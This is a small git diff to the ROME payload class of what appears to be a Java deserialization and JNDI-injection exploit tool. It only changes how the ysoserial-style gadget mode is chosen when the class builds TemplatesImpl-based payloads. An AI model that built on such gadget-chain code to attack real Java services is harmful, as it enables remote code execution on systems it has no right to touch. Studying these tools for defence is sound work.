@@ -9,6 +9,7 @@ import com.sun.syndication.feed.impl.ObjectBean;
 
 import javax.xml.transform.Templates;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 /**
@@ -34,7 +35,7 @@ public class ROME implements ObjectPayload<Object> {
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
         final Object templates;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             templates = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             templates = Gadgets.createTemplatesImpl(type, param);
